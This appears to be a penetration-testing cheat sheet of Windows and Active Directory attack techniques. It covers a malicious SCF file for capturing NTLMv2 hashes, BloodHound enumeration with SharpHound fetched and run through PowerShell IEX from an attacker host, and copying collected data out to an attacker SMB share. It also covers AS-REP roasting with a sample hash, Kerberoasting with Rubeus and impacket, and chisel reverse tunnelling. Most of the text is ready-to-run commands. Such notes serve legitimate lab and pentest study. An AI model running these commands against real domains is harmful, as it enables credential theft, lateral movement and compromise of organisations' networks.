# Windows vulnerability {-}

## Use scf file to get the NTLMv2 hash {-}

**SCF** (Shell Command File) are simple files that can be used to perform a connection to the attacker machine by using the
**SMB** protocol. The intersting purpose of those kind of files is that they can perform small and limited set of operations,
but can be executed when the user will browse the file, without the explicit necessity to execute it.

The attacker can take profit of this vulnerability to make a request to his own machine and then get the NTLMv2 hash of the victim one.

1. in a shell, create a shared folder and let it open

    ```bash
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. create the malicious scf file

    ```scf
    [Shell]
    Command=2
    IconFile=\\10.10.10.11\share\pentestlab.ico
    [Taskbar]
    Command=ToggleDesktop
    ```

1. copy the malicious file in the desired victim shared resource

That's it... Check the shared folder that you have created previously and if there is an interaction between the victim
and the file, you will receive the NTLMv2 hash of the victim.

You can then try to crack the hash with **john**

## Active Directory Enumeration {-}

As soon as we see port 88 and 389 or if victime machine changed the port number and we see Kerberos and LDAP, Attacker can estimate that the 
victim machine is a Domain Controller.

If we already have credentials, we can enumerate the Active Directory with the bloodhound package

### Injesting bloodhound from the attacker machine {-}

1. Install bloodhound injester
    
    ```bash
    python -m venv venv
    source venv/bin/activate
    pip install bloodhound
    ```

1. Run enumeration

    ```bash
    bloodhound-python -d victim.local -u username -p "Password" -gc machine.victim.local -c all -ns 10.10.10.11
    ```

1. New json files have been created in your working directory

    ```bash
    ls -la *.json
    zip htblocal.zip *.json 
    ```

### Injesting bloodhound from the victim {-}

You can also do the injester technique from the victim machine it self with the **Sharphound.ps1** script.

```bash
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
cat SharpHound.ps1 | grep "Invoke"
python -m http.server 80
```

Then in the victim machine, get the sharphound

```powershell
IEX(New-Object Net.WebClient).downloadString("http://10.10.10.11/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All
```

When the SharpHound is finished, you will see a `.zip` file in the victim machine that you need now to transfer on the
attacker one.

1. on the attacker machine
    
    ```bash
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. on the victim machine

    ```powershell
    copy zipfile.zip \\10.10.10.11\smbFolder\zipfile.zip
    ```

### Install bloodhound and run it {-}

1. Install bloodhound and neo4j

    ```bash
    sudo apt install neo4j bloodhound
    ```

1. Check that alternatives are not on java11

    ```bash
    update-alternatives --config java

    #dont user java 11
    ```

1. run neo4j service

    ```bash
    sudo neo4j console
    ```

1. run bloodhound

    ```bash
    bloodhound --no-sandbox &> /dev/null &
    disown
    ```

1. Connect bloodhound to neo4j database
1. Drag & Drop the **.zip** file and go to Analysis tab

    - Find all Domains Admins -> Show Administrator of the domain
    - Find Shortest Paths to Domain Admins -> Fastest way to be converted as Administrator
    - List all Kerberoastable Accounts -> Find users in wich attacker can execute a Kerberoasting attack (need of credentials)
    - Find Principals with DCSync Right -> Attacker can run a secretsdump attack to get all users hashes when user have GetChangesAll right.


## ASREPRoasing on Kerberos {-}

If the Kerberos pre-authentication has been disabled for an account, that means that it is vulnerable to ASREPRoasting.
As soon as we have a username, we can use the GetNPUsers script from impacket to retrieve it's password Hash

```bash
GetNPUsers.py domain/username -request -no-pass -dc-ip 10.10.10.11

#OUTPUT
[*] Getting TGT for username
$krb5asrep$23$username@domain:00c4e7b0ce1ad503425a4b0161021fe5$8d8d475c06d1fb191d431055f3dc5cf63e22ebcbb6cdf4a7cb122e
8f16374f221327e13be255eb60df449969b864abf3322c2c69c16738b9cbbd47ff1a67727656d7c7581c0df55280d19d4553c92fe86fb313fd7fb
843bd2e7796183d005edf241d9c89917239f29834ce6595f7359911e427b21a16154e552536dd1e1c66280e240ee9ea6d9d7ca5c462c5abf9a57ca
46db4af7c4a43b4261f5560257c58e6e1cc51ebe742dbeb903a7379ae7e2db8882018922feed8ae18ee799621de5f64bf0c10284e66a5017a2f6a13
b0ff132e99e715ecded126bdbd6347dd93a0cfff96a586fb5682ce5e04b2960b67401854
```

You can then copy the TGT in a file and try to crack it with john

## Kerberoasting attack {-}

A **Kerberoasting attack** can be done against Kerberoastable users that you find with Bloodhound and need at least a
user and password of a user from the domain.

### Kerberoasting attack on victim machine with rubeus {-}

**Rubeus.exe** is a tool that can perform Kerberoasting attack into the victim machine.

1. Download rubeus.exe on attacker machine

    ```bash
    git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
    ```

1. Send the rubeus to the victim machine and execute it

    - on attacker machine

        ```bash
        python -m http.server 80
        ```
    - on victim machine

        ```powershell
        iwr -uri http://10.10.10.11/Rubeus.exe -OutFile Rubeus.exe
        ```

1. Execute ther Kerberoasting attack on the victim machine (in this example we will perform a Kerberoasting with alternate credentials)

    ```powershell
    C:\temp\Rubeus.exe -> check the roating possibilities
    C:\temp\Rubeus.exe kerberoast /creduser:domain.local\user /credpassword:password1234
    ```

You will then see the hash that you can copy into the attacker machine and execute a hashcrack with **john**.  

### Kerberoasting attack from attacker machine with impacket-GetUserSPNs {-}

**Impacket-GetUserSPNs** is a script that can perform kerberoasting attack from the attacker machine. To do that,
the victim machine needs to have the port 88 open and attacker needs to have credentials of at list one domain user.

If port 88 is not externaly opened but you have access to the victim machine by a shell, you can make a reverse port
forwarding to achieve the **Kerberoasting attack** on local.

1. Sync clock with the victim machine

    ```bash
    rdate -n 10.10.10.10
    ```

1. Download chisel and build it on attacker machine

    ```bash
    git clone https://github.com/jpillora/chisel
    cd chisel
    go build -ldflags "-s -w" .
    du -hc chisel
    upx brute chisel
    du -hc chisel
    ```

1. Download chisel.exe on [github chisel release](https://github.com/jpillora/chisel/releases/tag/v1.7.6) and download the windows_amd64.gz
1. Transfer chisel.exe to the victim machine

    - on the attacker machine

        ```bash
        mv Downloads/Firefox/chisel_1.7.6_windows_amd64.gz chisel.exe.gz
        gunzip chisel.exe.gz
        python -m http.server 80
        ```

    - on the victim machine

        ```powershell
        iwr -uri htttp://10.10.10.11/chisel.exe -outFile chisel.exe
        ```

1. On the attacker machine create reverse server

    ```bash
    ./chisel server --reverse --port 1234
    ```

1. Port forward victim ports to attacker reverse server

    ```powershell
    C:\temp\chisel.exe client 10.10.10.11:1234 R:88:127.0.0.1:88
    ```

Thats it. we can now execute the Kerberoasting attack. Of course the above commands are necessary if the port 88 are not
externaly opened. 

- in the case of a victim with port 88 opened the attack will look as following:

    ```bash
    impacket-GetUserSPNs domain.local/user:password -request
    ```

- in the case of having to perform a reverse port forwarding

    ```bash
    impacket-GetUserSPNs domain.local/user:password -request -dc-ip 127.0.0.1
    ```

You will then see the hash that you can copy in a file and execute a hashcrack with **john**.
